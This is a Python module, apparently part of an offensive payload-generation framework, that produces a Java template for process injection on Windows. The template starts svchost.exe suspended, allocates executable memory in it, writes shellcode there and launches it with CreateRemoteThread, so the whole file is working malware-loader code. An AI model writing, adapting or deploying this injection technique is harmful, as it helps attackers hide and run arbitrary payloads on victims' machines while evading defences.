class spawnandinject:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ["import java.lang.foreign.Arena;",
                "import java.lang.foreign.FunctionDescriptor;",
                "import java.lang.foreign.Linker;",
                "import java.lang.foreign.MemoryLayout;",
                "import java.lang.foreign.MemorySegment;",
                "import java.lang.foreign.SymbolLookup;",
                "import java.lang.foreign.ValueLayout;",
                "import java.lang.invoke.MethodHandle;",
                "import static java.lang.foreign.ValueLayout.*;",]

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return """
        {transformers}

        MemorySegment cmdline = arena.allocateFrom("C:\\\\windows\\\\system32\\\\svchost.exe");

        MemorySegment si = arena.allocate(104);
        MemorySegment pi = arena.allocate(24);
        
        boolean created = (boolean) {CreateProcessA}(MemorySegment.NULL, cmdline, MemorySegment.NULL, MemorySegment.NULL, false, 0x4, MemorySegment.NULL, MemorySegment.NULL, si, pi);

        long hProcess = pi.get(ValueLayout.JAVA_LONG, 0);

        MemorySegment address = (MemorySegment) {VirtualAllocEx}(hProcess, MemorySegment.NULL, (long)shellcode.length, 0x3000, 0x40);

        address = address.reinterpret(shellcode.length);

        MemorySegment nativeSegment = arena.allocate(shellcode.length);
        MemorySegment.copy(MemorySegment.ofArray(shellcode), 0, nativeSegment, 0, shellcode.length);

        boolean written = (boolean) {WriteProcessMemory}(hProcess, address, nativeSegment, (long)shellcode.length, MemorySegment.NULL);

        long hThread = (long) {CreateRemoteThread}(hProcess, MemorySegment.NULL, (long)0, address, MemorySegment.NULL, 0, MemorySegment.NULL);

        int result = (int) {WaitForSingleObject}(hThread, 500);
        
"""